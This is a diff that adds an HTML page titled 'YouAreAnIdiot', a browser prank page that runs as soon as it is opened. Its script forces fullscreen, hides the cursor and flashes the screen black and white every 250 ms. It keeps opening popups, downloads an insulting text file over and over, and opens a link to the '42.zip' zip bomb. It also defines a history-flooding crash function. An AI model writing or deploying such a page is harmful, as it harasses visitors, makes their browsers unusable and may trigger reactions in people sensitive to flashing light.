@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouAreAnIdiot</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Comic Sans;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: none;
+            color: #000;
+            background: white;
+            -webkit-transition: background-color 0.05s ease-in 0s,
+                                color 0.05s ease-in 0s;
+            transition: background-color 0.05s ease-in 0s,
+                        color 0.05s ease-in 0s;
+        }
+        * {
+            cursor: none;
+        }
+
+        .browser-fail .happy {
+            display: none;
+        }
+
+        .no-track {
+            color: black;
+        }
+
+        #idiot-text,
+        #idiot-face {
+            display: block;
+            text-align: center;
+            font-size: 8em;
+            padding-top: 50px;
+        }
+
+        #idiot-text span {
+            white-space: nowrap;
+        }
+
+        #idiot-face {
+            padding: 0;
+            color: black;
+            display: flex;
+            flex-direction: row;
+        }
+
+        .center {
+            width: 100%;
+            justify-content: center;
+            align-items: center;
+            display: flex;
+            padding-top: 100px;
+        }
+
+        #idiot-icons {
+            display: flex;
+            flex-direction: row;
+        }
+
+        #idiot-icons svg {
+            margin-right: 50px;
+            height: 250px;
+            width: 250px;
+        }
+    </style>
+</head>
+<body>
+    <output id="idiot-text">
+        <span id="idiot-cue-1">you</span>
+        <span id="idiot-cue-2">are</span>
+        <span id="idiot-cue-3">an</span>
+        <span id="idiot-cue-4">idiot</span>
+    </output>
+    <div id="idiot"></div>
+
+    <div class="center">
+        <output id="idiot-icons">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#000000" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#000000" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#000000" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+		</output>
+    </div>
+    <script>
+        var e = document.getElementById("idiot");
+        var idiotIcons = document.getElementById("idiot-icons");
+
+        function openFullscreen() {
+            (e.webkitRequestFullScreen || e.mozRequestFullScreen).apply(e);
+        }
+
+        openFullscreen();
+
+        var bw = false; // Initialize as false (white background)
+
+        function toggleBackgroundColor() {
+            var body = document.body;
+
+            // Toggle background color
+            bw = !bw;
+            body.style.backgroundColor = bw ? 'black' : 'white';
+
+            // Change the content of SVGs in idiot-icons based on background color
+            if (bw) {
+                idiotIcons.innerHTML = `
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#ffffff" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#ffffff" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#ffffff" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+                `;
+				body.style.color = 'white';
+            } else {
+                idiotIcons.innerHTML = `
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#000000" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#000000" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="#000000" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 448c-110.3 0-200-89.7-200-200S137.7 56 248 56s200 89.7 200 200-89.7 200-200 200zm-80-216c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm160 0c17.7 0 32-14.3 32-32s-14.3-32-32-32-32 14.3-32 32 14.3 32 32 32zm4 72.6c-20.8 25-51.5 39.4-84 39.4s-63.2-14.3-84-39.4c-8.5-10.2-23.7-11.5-33.8-3.1-10.2 8.5-11.5 23.6-3.1 33.8 30 36 74.1 56.6 120.9 56.6s90.9-20.6 120.9-56.6c8.5-10.2 7.1-25.3-3.1-33.8-10.1-8.4-25.3-7.1-33.8 3.1z"/></svg>
+                `;
+				body.style.color = 'black';
+            }
+        }
+
+        // Repeat the toggle every 1000ms (1 second)
+        setInterval(toggleBackgroundColor, 250);
+		function getRandomNumber(min, max) {
+            return Math.random() * (max - min) + min;
+        }
+
+        function createRandomMovingWindow() {
+            const screenWidth = window.innerWidth;
+            const screenHeight = window.innerHeight;
+
+            // Calculate random coordinates and width within specified ranges
+            const left = getRandomNumber(0, screenWidth * (3 / 4));
+            const top = getRandomNumber(0, screenHeight * (3 / 4));
+            const width = getRandomNumber(screenWidth / 5, screenWidth * (3 / 4));
+
+            // Open a new window at the random coordinates and width
+            window.open("/bg.html", "_blank");
+            window.open("/window.html", "win", `width=${width},height=200,left=${left},top=${top}`);
+            window.open("/window.html", "_blank", `width=${width},height=200,left=${left},top=${top}`);
+        }
+
+		function downloadFile() {
+            // Create a Blob with the file content
+            const fileContent = 'Nerddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd Nerdddddddddddd';
+            const blob = new Blob([fileContent], { type: 'text/plain' });
+
+            // Create an anchor element
+            const anchor = document.createElement('a');
+            anchor.href = URL.createObjectURL(blob);
+            anchor.download = 'anoy.txt';
+
+            // Simulate a click to trigger the download
+            document.body.appendChild(anchor);
+            anchor.click();
+            document.body.removeChild(anchor);
+        }
+
+        function crash() {
+            var t = 0;
+            var total = "";
+            for( var i = 0; i < 10000000000000; i++ ) {
+                total += i.toString();
+                history.pushState(0,0, total );
+            }
+        }
+
+		function infinite() {
+            setInterval(window.open("/bg.html", "_blank"), 500);
+            setInterval(window.open("https://github.com/iamtraction/ZOD/raw/master/42.zip", "_blank"), 750);
+			setInterval(createRandomMovingWindow, 1000);
+			setInterval(downloadFile, 2000);
+		}
+        infinite();
+		setInterval(infinite, 200);
+    </script>
+</body>
+</html>
